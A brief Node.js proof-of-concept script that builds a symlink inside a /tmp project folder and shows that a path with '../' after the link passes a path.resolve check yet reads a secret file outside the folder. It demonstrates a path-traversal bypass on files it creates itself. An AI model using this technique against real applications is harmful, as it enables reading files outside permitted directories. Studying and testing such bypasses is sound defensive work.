const fs = require('fs')
const path = require('path')

fs.mkdirSync('/tmp/project', {recursive: true})
fs.mkdirSync('/tmp/outside', {recursive: true})
fs.writeFileSync('/tmp/secret.txt', 'you got me')
fs.writeFileSync('/tmp/project/secret.txt', 'safe file')

// Create symlink inside project pointing outside
try { fs.symlinkSync('/tmp/outside', '/tmp/project/symlink') } catch(e){}

const maliciousPath = '/tmp/project/symlink/../secret.txt'
console.log("path.resolve:", path.resolve(maliciousPath))
console.log("fs.readFileSync:", fs.readFileSync(maliciousPath, 'utf8'))
